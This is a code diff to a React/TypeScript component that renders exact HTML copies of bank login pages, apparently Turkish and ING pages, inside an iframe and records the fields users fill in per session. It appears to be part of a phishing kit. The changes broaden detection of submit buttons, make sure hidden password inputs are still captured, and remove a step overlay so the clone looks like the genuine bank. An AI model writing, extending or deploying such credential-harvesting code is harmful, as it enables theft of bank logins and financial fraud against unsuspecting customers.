@@ -20,7 +20,19 @@ type CapturedField = {
   type: string;
 };
 
-const ACTION_BUTTON_RE = /(log\s?in|login|sign\s?in|continue|next|access|submit|confirm|go|enter|ilerle|ileri|devam|tamamla)/i;
+const ACTION_BUTTON_RE = /(log\s?in|login|sign\s?in|continue|next|access|submit|confirm|go|enter|ilerle|ileri|devam|tamamla|giriş|giris|tamam|sonraki|onayla|onay|sıra|sıradaki|next\s*step|step\s*next)/i;
+
+function getElementActionToken(el: HTMLElement) {
+  return normalizeToken([
+    el.textContent,
+    el instanceof HTMLInputElement ? el.value : "",
+    el.getAttribute("aria-label"),
+    el.getAttribute("value"),
+    el.getAttribute("title"),
+    el.getAttribute("data-label"),
+    el.getAttribute("data-text"),
+  ].join(" "));
+}
 
 function normalizeToken(value: string | null | undefined) {
   return (value ?? "").trim().toLowerCase().replace(/[^a-z0-9]+/g, " ");
@@ -95,6 +107,7 @@ function isMeaningfulField(el: HTMLInputElement | HTMLTextAreaElement | HTMLSele
   if ((type === "checkbox" || type === "radio") && !(el as HTMLInputElement).checked) return false;
   if (el.disabled) return false;
   if (el.getAttribute("aria-hidden") === "true") return false;
+  // ⭐ tabindex=-1 ise bile MOUSE ile değer girilebilir (ING password input gibi), YİNE de alanı say!
   return true;
 }
 
@@ -498,16 +511,12 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       ),
     );
     actionNodes.forEach((node) => {
-      const nodeText =
-        node.textContent?.trim() ||
-        node.getAttribute("value") ||
-        node.getAttribute("aria-label") ||
-        "";
+      const nodeToken = getElementActionToken(node);
       const isSubmitInput =
         node instanceof HTMLInputElement &&
         ["submit", "button"].includes((node.getAttribute("type") ?? "").toLowerCase());
 
-      if (!(ACTION_BUTTON_RE.test(nodeText) || isSubmitInput)) {
+      if (!(ACTION_BUTTON_RE.test(nodeToken) || isSubmitInput)) {
         return;
       }
 
@@ -568,32 +577,6 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
   return (
     <div className="relative min-h-screen bg-white">
-      {isMultiStep ? (
-        <div className="sticky top-0 z-50 w-full border-b border-gray-200 bg-white/95 px-4 py-2 backdrop-blur sm:px-6">
-          <div className="mx-auto flex max-w-4xl items-center justify-between">
-            <div className="flex items-center gap-3">
-              <span className="rounded-full bg-gray-900 px-3 py-1 text-[11px] font-bold uppercase tracking-wider text-white">
-                Step {stepIndex + 1} / {totalSteps}
-              </span>
-              <span className="text-xs font-medium text-gray-600">{bankName}</span>
-            </div>
-            <div className="flex gap-1.5">
-              {Array.from({ length: totalSteps }).map((_, i) => (
-                <span
-                  key={i}
-                  className={`h-2 w-10 rounded-full transition-all duration-300 ${
-                    i < stepIndex
-                      ? "bg-emerald-500"
-                      : i === stepIndex
-                        ? "bg-blue-600"
-                        : "bg-gray-200"
-                  }`}
-                />
-              ))}
-            </div>
-          </div>
-        </div>
-      ) : null}
       <iframe
         ref={iframeRef}
         title={`${bankName} login`}
